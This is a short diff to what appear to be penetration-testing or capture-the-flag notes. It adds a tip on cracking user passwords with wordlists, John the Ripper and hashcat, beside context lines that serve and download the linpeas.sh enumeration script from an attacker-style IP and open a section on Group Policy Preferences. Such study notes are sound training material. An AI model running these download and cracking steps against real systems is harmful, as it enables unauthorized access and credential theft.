@@ -9,6 +9,10 @@ python3 -m http.server 80
 curl -O http://10.10.14.24/linpeas.sh
 ```
 
+# About finding passwords for users
+
+- Use every wordlist and johntheripper/hashcat and try to find password
+
 # About Group Policy Preferences
 
 Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features,
